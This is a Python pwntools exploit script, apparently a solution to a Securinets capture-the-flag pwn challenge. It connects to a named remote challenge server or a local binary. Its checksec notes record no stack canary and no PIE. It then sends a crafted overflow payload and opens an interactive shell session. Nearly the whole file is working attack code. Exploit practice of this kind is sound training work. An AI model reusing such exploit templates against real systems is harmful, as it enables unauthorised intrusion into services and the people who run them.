#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './main'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'pwn-14caf623.p1.securinets.tn', 9000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x40137f
c
'''.format(**locals())

def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(d1, d2=0):
  io.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return io.recvuntil(d2,drop=True)

# =========================================================
#                         EXPLOITS
# =========================================================
# $ file main 
# main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f129de0681208a6514c56ab74c9a03ad7e30fe41, for GNU/Linux 3.2.0, not stripped
# $ pwn checksec main 
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     Stripped:   No

def exploit():
    global io
    io = initialize()

    payload = b'ab'*198
    payload += (p8(0xa6)*0x11)

    sa(b':', payload)
    sla(b':', b'exit')

    io.interactive()
    
if __name__ == '__main__':
    exploit()
